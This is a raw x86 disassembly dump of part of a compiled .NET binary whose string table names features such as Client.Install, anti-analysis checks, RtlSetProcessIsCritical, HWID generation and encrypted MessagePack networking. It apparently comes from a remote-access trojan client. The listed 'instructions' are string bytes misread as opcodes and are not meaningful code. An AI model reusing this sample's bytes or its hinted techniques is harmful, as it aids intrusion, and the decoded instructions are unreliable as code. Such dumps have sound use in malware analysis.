  407fc8:	6f                   	outsl  %ds:(%esi),(%dx)
  407fc9:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  407fcc:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  407fd3:	5f                   	pop    %edi
  407fd4:	54                   	push   %esp
  407fd5:	6f                   	outsl  %ds:(%esi),(%dx)
  407fd6:	74 61                	je     0x408039
  407fd8:	6c                   	insb   (%dx),%es:(%edi)
  407fd9:	53                   	push   %ebx
  407fda:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  407fe1:	5f                   	pop    %edi
  407fe2:	48                   	dec    %eax
  407fe3:	65 61                	gs popa
  407fe5:	64 65 72 53          	fs gs jb 0x40803c
  407fe9:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407ff0:	5f                   	pop    %edi
  407ff1:	48                   	dec    %eax
  407ff2:	65 61                	gs popa
  407ff4:	64 65 72 53          	fs gs jb 0x40804b
  407ff8:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  407fff:	5f                   	pop    %edi
  408000:	53                   	push   %ebx
  408001:	65 6e                	outsb  %gs:(%esi),(%dx)
  408003:	64 42                	fs inc %edx
  408005:	75 66                	jne    0x40806d
  408007:	66 65 72 53          	data16 gs jb 0x40805e
  40800b:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408012:	5f                   	pop    %edi
  408013:	52                   	push   %edx
  408014:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  408018:	76 65                	jbe    0x40807f
  40801a:	42                   	inc    %edx
  40801b:	75 66                	jne    0x408083
  40801d:	66 65 72 53          	data16 gs jb 0x408074
  408021:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408028:	5f                   	pop    %edi
  408029:	4b                   	dec    %ebx
  40802a:	65 79 53             	gs jns 0x408080
  40802d:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408034:	65 78 4f             	gs js  0x408086
  408037:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  40803b:	72 46                	jb     0x408083
  40803d:	6c                   	insb   (%dx),%es:(%edi)
  40803e:	61                   	popa
  40803f:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408043:	79 70                	jns    0x4080b5
  408045:	74 6f                	je     0x4080b6
  408047:	43                   	inc    %ebx
  408048:	6f                   	outsl  %ds:(%esi),(%dx)
  408049:	6e                   	outsb  %ds:(%esi),(%dx)
  40804a:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408050:	74 5f                	je     0x4080b1
  408052:	50                   	push   %eax
  408053:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40805a:	5f                   	pop    %edi
  40805b:	50                   	push   %eax
  40805c:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408063:	74 65                	je     0x4080ca
  408065:	6d                   	insl   (%dx),%es:(%edi)
  408066:	2e 54                	cs push %esp
  408068:	68 72 65 61 64       	push   $0x64616572
  40806d:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408074:	5f                   	pop    %edi
  408075:	50                   	push   %eax
  408076:	61                   	popa
  408077:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  40807e:	64 64 
  408080:	5f                   	pop    %edi
  408081:	53                   	push   %ebx
  408082:	65 73 73             	gs jae 0x4080f8
  408085:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40808c:	6e                   	outsb  %ds:(%esi),(%dx)
  40808d:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408091:	73 74                	jae    0x408107
  408093:	65 6d                	gs insl (%dx),%es:(%edi)
  408095:	45                   	inc    %ebp
  408096:	76 65                	jbe    0x4080fd
  408098:	6e                   	outsb  %ds:(%esi),(%dx)
  408099:	74 73                	je     0x40810e
  40809b:	5f                   	pop    %edi
  40809c:	53                   	push   %ebx
  40809d:	65 73 73             	gs jae 0x408113
  4080a0:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4080a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4080a8:	67 00 55 54          	add    %dl,0x54(%di)
  4080ac:	46                   	inc    %esi
  4080ad:	38 45 6e             	cmp    %al,0x6e(%ebp)
  4080b0:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4080b3:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4080ba:	74 65                	je     0x408121
  4080bc:	6d                   	insl   (%dx),%es:(%edi)
  4080bd:	2e 44                	cs inc %esp
  4080bf:	72 61                	jb     0x408122
  4080c1:	77 69                	ja     0x40812c
  4080c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4080c4:	67 2e 49             	addr16 cs dec %ecx
  4080c7:	6d                   	insl   (%dx),%es:(%edi)
  4080c8:	61                   	popa
  4080c9:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  4080d0:	73 
  4080d1:	74 65                	je     0x408138
  4080d3:	6d                   	insl   (%dx),%es:(%edi)
  4080d4:	2e 52                	cs push %edx
  4080d6:	75 6e                	jne    0x408146
  4080d8:	74 69                	je     0x408143
  4080da:	6d                   	insl   (%dx),%es:(%edi)
  4080db:	65 2e 56             	gs cs push %esi
  4080de:	65 72 73             	gs jb  0x408154
  4080e1:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  4080e8:	46                   	inc    %esi
  4080e9:	72 6f                	jb     0x40815a
  4080eb:	6d                   	insl   (%dx),%es:(%edi)
  4080ec:	42                   	inc    %edx
  4080ed:	61                   	popa
  4080ee:	73 65                	jae    0x408155
  4080f0:	36 34 53             	ss xor $0x53,%al
  4080f3:	74 72                	je     0x408167
  4080f5:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  4080fc:	61                   	popa
  4080fd:	73 65                	jae    0x408164
  4080ff:	36 34 53             	ss xor $0x53,%al
  408102:	74 72                	je     0x408176
  408104:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40810b:	64 53                	fs push %ebx
  40810d:	74 72                	je     0x408181
  40810f:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408116:	6e                   	outsb  %ds:(%esi),(%dx)
  408117:	6c                   	insb   (%dx),%es:(%edi)
  408118:	6f                   	outsl  %ds:(%esi),(%dx)
  408119:	61                   	popa
  40811a:	64 53                	fs push %ebx
  40811c:	74 72                	je     0x408190
  40811e:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408125:	74 65                	je     0x40818c
  408127:	53                   	push   %ebx
  408128:	74 72                	je     0x40819c
  40812a:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408131:	74 72                	je     0x4081a5
  408133:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40813a:	5f                   	pop    %edi
  40813b:	41                   	inc    %ecx
  40813c:	73 53                	jae    0x408191
  40813e:	74 72                	je     0x4081b2
  408140:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408147:	5f                   	pop    %edi
  408148:	41                   	inc    %ecx
  408149:	73 53                	jae    0x40819e
  40814b:	74 72                	je     0x4081bf
  40814d:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  408154:	65 73 41             	gs jae 0x408198
  408157:	73 53                	jae    0x4081ac
  408159:	74 72                	je     0x4081cd
  40815b:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408162:	41                   	inc    %ecx
  408163:	73 53                	jae    0x4081b8
  408165:	74 72                	je     0x4081d9
  408167:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  40816e:	41                   	inc    %ecx
  40816f:	73 53                	jae    0x4081c4
  408171:	74 72                	je     0x4081e5
  408173:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  40817a:	53                   	push   %ebx
  40817b:	74 72                	je     0x4081ef
  40817d:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  408184:	65 73 41             	gs jae 0x4081c8
  408187:	73 48                	jae    0x4081d1
  408189:	65 78 53             	gs js  0x4081df
  40818c:	74 72                	je     0x408200
  40818e:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408195:	73 74                	jae    0x40820b
  408197:	72 69                	jb     0x408202
  408199:	6e                   	outsb  %ds:(%esi),(%dx)
  40819a:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  40819e:	73 74                	jae    0x408214
  4081a0:	65 6d                	gs insl (%dx),%es:(%edi)
  4081a2:	2e 44                	cs inc %esp
  4081a4:	72 61                	jb     0x408207
  4081a6:	77 69                	ja     0x408211
  4081a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4081a9:	67 00 50 6f          	add    %dl,0x6f(%bx,%si)
  4081ad:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ae:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  4081b2:	74 5f                	je     0x408213
  4081b4:	45                   	inc    %ebp
  4081b5:	72 72                	jb     0x408229
  4081b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4081b8:	72 44                	jb     0x4081fe
  4081ba:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  4081c1:	73 67                	jae    0x40822a
  4081c3:	00 43 6f             	add    %al,0x6f(%ebx)
  4081c6:	6d                   	insl   (%dx),%es:(%edi)
  4081c7:	70 75                	jo     0x40823e
  4081c9:	74 65                	je     0x408230
  4081cb:	48                   	dec    %eax
  4081cc:	61                   	popa
  4081cd:	73 68                	jae    0x408237
  4081cf:	00 73 74             	add    %dh,0x74(%ebx)
  4081d2:	72 54                	jb     0x408228
  4081d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4081d5:	48                   	dec    %eax
  4081d6:	61                   	popa
  4081d7:	73 68                	jae    0x408241
  4081d9:	00 47 65             	add    %al,0x65(%edi)
  4081dc:	74 48                	je     0x408226
  4081de:	61                   	popa
  4081df:	73 68                	jae    0x408249
  4081e1:	00 56 65             	add    %dl,0x65(%esi)
  4081e4:	72 69                	jb     0x40824f
  4081e6:	66 79 48             	data16 jns 0x408231
  4081e9:	61                   	popa
  4081ea:	73 68                	jae    0x408254
  4081ec:	00 46 6c             	add    %al,0x6c(%esi)
  4081ef:	75 73                	jne    0x408264
  4081f1:	68 00 67 65 74       	push   $0x74656700
  4081f6:	5f                   	pop    %edi
  4081f7:	45                   	inc    %ebp
  4081f8:	78 65                	js     0x40825f
  4081fa:	63 75 74             	arpl   %esi,0x74(%ebp)
  4081fd:	61                   	popa
  4081fe:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408202:	61                   	popa
  408203:	74 68                	je     0x40826d
  408205:	00 47 65             	add    %al,0x65(%edi)
  408208:	74 54                	je     0x40825e
  40820a:	65 6d                	gs insl (%dx),%es:(%edi)
  40820c:	70 50                	jo     0x40825e
  40820e:	61                   	popa
  40820f:	74 68                	je     0x408279
  408211:	00 70 61             	add    %dh,0x61(%eax)
  408214:	74 68                	je     0x40827e
  408216:	00 48 6d             	add    %cl,0x6d(%eax)
  408219:	61                   	popa
  40821a:	63 53 68             	arpl   %edx,0x68(%ebx)
  40821d:	61                   	popa
  40821e:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408224:	67 74 68             	addr16 je 0x40828f
  408227:	00 67 65             	add    %ah,0x65(%edi)
  40822a:	74 5f                	je     0x40828b
  40822c:	4c                   	dec    %esp
  40822d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40822f:	67 74 68             	addr16 je 0x40829a
  408232:	00 49 76             	add    %cl,0x76(%ecx)
  408235:	4c                   	dec    %esp
  408236:	65 6e                	outsb  %gs:(%esi),(%dx)
  408238:	67 74 68             	addr16 je 0x4082a3
  40823b:	00 41 75             	add    %al,0x75(%ecx)
  40823e:	74 68                	je     0x4082a8
  408240:	4b                   	dec    %ebx
  408241:	65 79 4c             	gs jns 0x408290
  408244:	65 6e                	outsb  %gs:(%esi),(%dx)
  408246:	67 74 68             	addr16 je 0x4082b1
  408249:	00 55 72             	add    %dl,0x72(%ebp)
  40824c:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  408252:	00 6d 73             	add    %ch,0x73(%ebp)
  408255:	67 70 61             	addr16 jo 0x4082b9
  408258:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  40825b:	62 6a 00             	bound  %ebp,0x0(%edx)
  40825e:	6c                   	insb   (%dx),%es:(%edi)
  40825f:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  408266:	6f                   	outsl  %ds:(%esi),(%dx)
  408267:	62 6a 00             	bound  %ebp,0x0(%edx)
  40826a:	43                   	inc    %ebx
  40826b:	6c                   	insb   (%dx),%es:(%edi)
  40826c:	69 65 6e 74 2e 4d 65 	imul   $0x654d2e74,0x6e(%ebp),%esp
  408273:	73 73                	jae    0x4082e8
  408275:	61                   	popa
  408276:	67 65 50             	addr16 gs push %eax
  408279:	61                   	popa
  40827a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40827d:	4d                   	dec    %ebp
  40827e:	73 67                	jae    0x4082e7
  408280:	50                   	push   %eax
  408281:	61                   	popa
  408282:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408285:	41                   	inc    %ecx
  408286:	73 79                	jae    0x408301
  408288:	6e                   	outsb  %ds:(%esi),(%dx)
  408289:	63 43 61             	arpl   %eax,0x61(%ebx)
  40828c:	6c                   	insb   (%dx),%es:(%edi)
  40828d:	6c                   	insb   (%dx),%es:(%edi)
  40828e:	62 61 63             	bound  %esp,0x63(%ecx)
  408291:	6b 00 52             	imul   $0x52,(%eax),%eax
  408294:	65 6d                	gs insl (%dx),%es:(%edi)
  408296:	6f                   	outsl  %ds:(%esi),(%dx)
  408297:	74 65                	je     0x4082fe
  408299:	43                   	inc    %ebx
  40829a:	65 72 74             	gs jb  0x408311
  40829d:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  4082a4:	56                   	push   %esi
  4082a5:	61                   	popa
  4082a6:	6c                   	insb   (%dx),%es:(%edi)
  4082a7:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  4082ae:	43 
  4082af:	61                   	popa
  4082b0:	6c                   	insb   (%dx),%es:(%edi)
  4082b1:	6c                   	insb   (%dx),%es:(%edi)
  4082b2:	62 61 63             	bound  %esp,0x63(%ecx)
  4082b5:	6b 00 54             	imul   $0x54,(%eax),%eax
  4082b8:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  4082bf:	6c                   	insb   (%dx),%es:(%edi)
  4082c0:	62 61 63             	bound  %esp,0x63(%ecx)
  4082c3:	6b 00 75             	imul   $0x75,(%eax),%eax
  4082c6:	6e                   	outsb  %ds:(%esi),(%dx)
  4082c7:	70 61                	jo     0x40832a
  4082c9:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  4082cc:	6d                   	insl   (%dx),%es:(%edi)
  4082cd:	73 67                	jae    0x408336
  4082cf:	70 61                	jo     0x408332
  4082d1:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4082d4:	52                   	push   %edx
  4082d5:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4082dc:	4b 65 
  4082de:	79 50                	jns    0x408330
  4082e0:	65 72 6d             	gs jb  0x408350
  4082e3:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  4082ea:	68 65 63 6b 00       	push   $0x6b6365
  4082ef:	46                   	inc    %esi
  4082f0:	6c                   	insb   (%dx),%es:(%edi)
  4082f1:	75 73                	jne    0x408366
  4082f3:	68 46 69 6e 61       	push   $0x616e6946
  4082f8:	6c                   	insb   (%dx),%es:(%edi)
  4082f9:	42                   	inc    %edx
  4082fa:	6c                   	insb   (%dx),%es:(%edi)
  4082fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4082fc:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4082ff:	49                   	dec    %ecx
  408300:	73 53                	jae    0x408355
  408302:	6d                   	insl   (%dx),%es:(%edi)
  408303:	61                   	popa
  408304:	6c                   	insb   (%dx),%es:(%edi)
  408305:	6c                   	insb   (%dx),%es:(%edi)
  408306:	44                   	inc    %esp
  408307:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  40830e:	6c                   	insb   (%dx),%es:(%edi)
  40830f:	00 66 56             	add    %ah,0x56(%esi)
  408312:	61                   	popa
  408313:	6c                   	insb   (%dx),%es:(%edi)
  408314:	00 69 56             	add    %ch,0x56(%ecx)
  408317:	61                   	popa
  408318:	6c                   	insb   (%dx),%es:(%edi)
  408319:	00 73 74             	add    %dh,0x74(%ebx)
  40831c:	72 56                	jb     0x408374
  40831e:	61                   	popa
  40831f:	6c                   	insb   (%dx),%es:(%edi)
  408320:	00 52 74             	add    %dl,0x74(%edx)
  408323:	6c                   	insb   (%dx),%es:(%edi)
  408324:	53                   	push   %ebx
  408325:	65 74 50             	gs je  0x408378
  408328:	72 6f                	jb     0x408399
  40832a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40832d:	73 49                	jae    0x408378
  40832f:	73 43                	jae    0x408374
  408331:	72 69                	jb     0x40839c
  408333:	74 69                	je     0x40839e
  408335:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408338:	00 50 72             	add    %dl,0x72(%eax)
  40833b:	6f                   	outsl  %ds:(%esi),(%dx)
  40833c:	63 65 73             	arpl   %esp,0x73(%ebp)
  40833f:	73 43                	jae    0x408384
  408341:	72 69                	jb     0x4083ac
  408343:	74 69                	je     0x4083ae
  408345:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408348:	00 4e 65             	add    %cl,0x65(%esi)
  40834b:	74 77                	je     0x4083c4
  40834d:	6f                   	outsl  %ds:(%esi),(%dx)
  40834e:	72 6b                	jb     0x4083bb
  408350:	43                   	inc    %ebx
  408351:	72 65                	jb     0x4083b8
  408353:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408356:	74 69                	je     0x4083c1
  408358:	61                   	popa
  408359:	6c                   	insb   (%dx),%es:(%edi)
  40835a:	00 53 79             	add    %dl,0x79(%ebx)
  40835d:	73 74                	jae    0x4083d3
  40835f:	65 6d                	gs insl (%dx),%es:(%edi)
  408361:	2e 53                	cs push %ebx
  408363:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408367:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  40836e:	6e 
  40836f:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408372:	61                   	popa
  408373:	6c                   	insb   (%dx),%es:(%edi)
  408374:	00 57 69             	add    %dl,0x69(%edi)
  408377:	6e                   	outsb  %ds:(%esi),(%dx)
  408378:	64 6f                	outsl  %fs:(%esi),(%dx)
  40837a:	77 73                	ja     0x4083ef
  40837c:	50                   	push   %eax
  40837d:	72 69                	jb     0x4083e8
  40837f:	6e                   	outsb  %ds:(%esi),(%dx)
  408380:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408383:	61                   	popa
  408384:	6c                   	insb   (%dx),%es:(%edi)
  408385:	00 41 72             	add    %al,0x72(%ecx)
  408388:	65 45                	gs inc %ebp
  40838a:	71 75                	jno    0x408401
  40838c:	61                   	popa
  40838d:	6c                   	insb   (%dx),%es:(%edi)
  40838e:	00 67 65             	add    %ah,0x65(%edi)
  408391:	74 5f                	je     0x4083f2
  408393:	49                   	dec    %ecx
  408394:	6e                   	outsb  %ds:(%esi),(%dx)
  408395:	74 65                	je     0x4083fc
  408397:	72 76                	jb     0x40840f
  408399:	61                   	popa
  40839a:	6c                   	insb   (%dx),%es:(%edi)
  40839b:	00 73 65             	add    %dh,0x65(%ebx)
  40839e:	74 5f                	je     0x4083ff
  4083a0:	49                   	dec    %ecx
  4083a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4083a2:	74 65                	je     0x408409
  4083a4:	72 76                	jb     0x40841c
  4083a6:	61                   	popa
  4083a7:	6c                   	insb   (%dx),%es:(%edi)
  4083a8:	00 43 6c             	add    %al,0x6c(%ebx)
  4083ab:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  4083b2:	73 74                	jae    0x408428
  4083b4:	61                   	popa
  4083b5:	6c                   	insb   (%dx),%es:(%edi)
  4083b6:	6c                   	insb   (%dx),%es:(%edi)
  4083b7:	00 6b 65             	add    %ch,0x65(%ebx)
  4083ba:	72 6e                	jb     0x40842a
  4083bc:	65 6c                	gs insb (%dx),%es:(%edi)
  4083be:	33 32                	xor    (%edx),%esi
  4083c0:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4083c3:	6c                   	insb   (%dx),%es:(%edi)
  4083c4:	00 6e 74             	add    %ch,0x74(%esi)
  4083c7:	64 6c                	fs insb (%dx),%es:(%edi)
  4083c9:	6c                   	insb   (%dx),%es:(%edi)
  4083ca:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4083cd:	6c                   	insb   (%dx),%es:(%edi)
  4083ce:	00 4b 69             	add    %cl,0x69(%ebx)
  4083d1:	6c                   	insb   (%dx),%es:(%edi)
  4083d2:	6c                   	insb   (%dx),%es:(%edi)
  4083d3:	00 50 6f             	add    %dl,0x6f(%eax)
  4083d6:	6c                   	insb   (%dx),%es:(%edi)
  4083d7:	6c                   	insb   (%dx),%es:(%edi)
  4083d8:	00 57 72             	add    %dl,0x72(%edi)
  4083db:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  4083e2:	00 
  4083e3:	53                   	push   %ebx
  4083e4:	65 74 41             	gs je  0x408428
  4083e7:	73 4e                	jae    0x408437
  4083e9:	75 6c                	jne    0x408457
  4083eb:	6c                   	insb   (%dx),%es:(%edi)
  4083ec:	00 4d 75             	add    %cl,0x75(%ebp)
  4083ef:	74 65                	je     0x408456
  4083f1:	78 43                	js     0x408436
  4083f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4083f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4083f5:	74 72                	je     0x408469
  4083f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4083f8:	6c                   	insb   (%dx),%es:(%edi)
  4083f9:	00 45 6e             	add    %al,0x6e(%ebp)
  4083fc:	63 6f 64             	arpl   %ebp,0x64(%edi)
  4083ff:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408403:	72 65                	jb     0x40846a
  408405:	61                   	popa
  408406:	6d                   	insl   (%dx),%es:(%edi)
  408407:	00 46 69             	add    %al,0x69(%esi)
  40840a:	6c                   	insb   (%dx),%es:(%edi)
  40840b:	65 53                	gs push %ebx
  40840d:	74 72                	je     0x408481
  40840f:	65 61                	gs popa
  408411:	6d                   	insl   (%dx),%es:(%edi)
  408412:	00 4e 65             	add    %cl,0x65(%esi)
  408415:	74 77                	je     0x40848e
  408417:	6f                   	outsl  %ds:(%esi),(%dx)
  408418:	72 6b                	jb     0x408485
  40841a:	53                   	push   %ebx
  40841b:	74 72                	je     0x40848f
  40841d:	65 61                	gs popa
  40841f:	6d                   	insl   (%dx),%es:(%edi)
  408420:	00 53 73             	add    %dl,0x73(%ebx)
  408423:	6c                   	insb   (%dx),%es:(%edi)
  408424:	53                   	push   %ebx
  408425:	74 72                	je     0x408499
  408427:	65 61                	gs popa
  408429:	6d                   	insl   (%dx),%es:(%edi)
  40842a:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  40842e:	6f                   	outsl  %ds:(%esi),(%dx)
  40842f:	64 65 46             	fs gs inc %esi
  408432:	72 6f                	jb     0x4084a3
  408434:	6d                   	insl   (%dx),%es:(%edi)
  408435:	53                   	push   %ebx
  408436:	74 72                	je     0x4084aa
  408438:	65 61                	gs popa
  40843a:	6d                   	insl   (%dx),%es:(%edi)
  40843b:	00 43 72             	add    %al,0x72(%ebx)
  40843e:	79 70                	jns    0x4084b0
  408440:	74 6f                	je     0x4084b1
  408442:	53                   	push   %ebx
  408443:	74 72                	je     0x4084b7
  408445:	65 61                	gs popa
  408447:	6d                   	insl   (%dx),%es:(%edi)
  408448:	00 47 5a             	add    %al,0x5a(%edi)
  40844b:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  408452:	6d                   	insl   (%dx),%es:(%edi)
  408453:	00 4d 65             	add    %cl,0x65(%ebp)
  408456:	6d                   	insl   (%dx),%es:(%edi)
  408457:	6f                   	outsl  %ds:(%esi),(%dx)
  408458:	72 79                	jb     0x4084d3
  40845a:	53                   	push   %ebx
  40845b:	74 72                	je     0x4084cf
  40845d:	65 61                	gs popa
  40845f:	6d                   	insl   (%dx),%es:(%edi)
  408460:	00 50 72             	add    %dl,0x72(%eax)
  408463:	6f                   	outsl  %ds:(%esi),(%dx)
  408464:	67 72 61             	addr16 jb 0x4084c8
  408467:	6d                   	insl   (%dx),%es:(%edi)
  408468:	00 67 65             	add    %ah,0x65(%edi)
  40846b:	74 5f                	je     0x4084cc
  40846d:	49                   	dec    %ecx
  40846e:	74 65                	je     0x4084d5
  408470:	6d                   	insl   (%dx),%es:(%edi)
  408471:	00 67 65             	add    %ah,0x65(%edi)
  408474:	74 5f                	je     0x4084d5
  408476:	49                   	dec    %ecx
  408477:	73 36                	jae    0x4084af
  408479:	34 42                	xor    $0x42,%al
  40847b:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408482:	74 
  408483:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40848a:	65 6d                	gs insl (%dx),%es:(%edi)
  40848c:	00 43 6c             	add    %al,0x6c(%ebx)
  40848f:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408496:	67 6f                	outsl  %ds:(%si),(%dx)
  408498:	72 69                	jb     0x408503
  40849a:	74 68                	je     0x408504
  40849c:	6d                   	insl   (%dx),%es:(%edi)
  40849d:	00 53 79             	add    %dl,0x79(%ebx)
  4084a0:	6d                   	insl   (%dx),%es:(%edi)
  4084a1:	6d                   	insl   (%dx),%es:(%edi)
  4084a2:	65 74 72             	gs je  0x408517
  4084a5:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4084ac:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  4084b3:	79 
  4084b4:	6d                   	insl   (%dx),%es:(%edi)
  4084b5:	6d                   	insl   (%dx),%es:(%edi)
  4084b6:	65 74 72             	gs je  0x40852b
  4084b9:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  4084c0:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  4084c7:	73 
  4084c8:	68 41 6c 67 6f       	push   $0x6f676c41
  4084cd:	72 69                	jb     0x408538
  4084cf:	74 68                	je     0x408539
  4084d1:	6d                   	insl   (%dx),%es:(%edi)
  4084d2:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  4084d6:	6d                   	insl   (%dx),%es:(%edi)
  4084d7:	00 52 61             	add    %dl,0x61(%edx)
  4084da:	6e                   	outsb  %ds:(%esi),(%dx)
  4084db:	64 6f                	outsl  %fs:(%esi),(%dx)
  4084dd:	6d                   	insl   (%dx),%es:(%edi)
  4084de:	00 49 43             	add    %cl,0x43(%ecx)
  4084e1:	72 79                	jb     0x40855c
  4084e3:	70 74                	jo     0x408559
  4084e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4084e6:	54                   	push   %esp
  4084e7:	72 61                	jb     0x40854a
  4084e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ea:	73 66                	jae    0x408552
  4084ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ed:	72 6d                	jb     0x40855c
  4084ef:	00 4d 73             	add    %cl,0x73(%ebp)
  4084f2:	67 50                	addr16 push %eax
  4084f4:	61                   	popa
  4084f5:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  4084f8:	6e                   	outsb  %ds:(%esi),(%dx)
  4084f9:	75 6d                	jne    0x408568
  4084fb:	00 57 72             	add    %dl,0x72(%edi)
  4084fe:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408505:	65 
  408506:	61                   	popa
  408507:	6e                   	outsb  %ds:(%esi),(%dx)
  408508:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  40850c:	6f                   	outsl  %ds:(%esi),(%dx)
  40850d:	6f                   	outsl  %ds:(%esi),(%dx)
  40850e:	6c                   	insb   (%dx),%es:(%edi)
  40850f:	65 61                	gs popa
  408511:	6e                   	outsb  %ds:(%esi),(%dx)
  408512:	00 53 65             	add    %dl,0x65(%ebx)
  408515:	74 41                	je     0x408558
  408517:	73 42                	jae    0x40855b
  408519:	6f                   	outsl  %ds:(%esi),(%dx)
  40851a:	6f                   	outsl  %ds:(%esi),(%dx)
  40851b:	6c                   	insb   (%dx),%es:(%edi)
  40851c:	65 61                	gs popa
  40851e:	6e                   	outsb  %ds:(%esi),(%dx)
  40851f:	00 48 77             	add    %cl,0x77(%eax)
  408522:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  408529:	65 
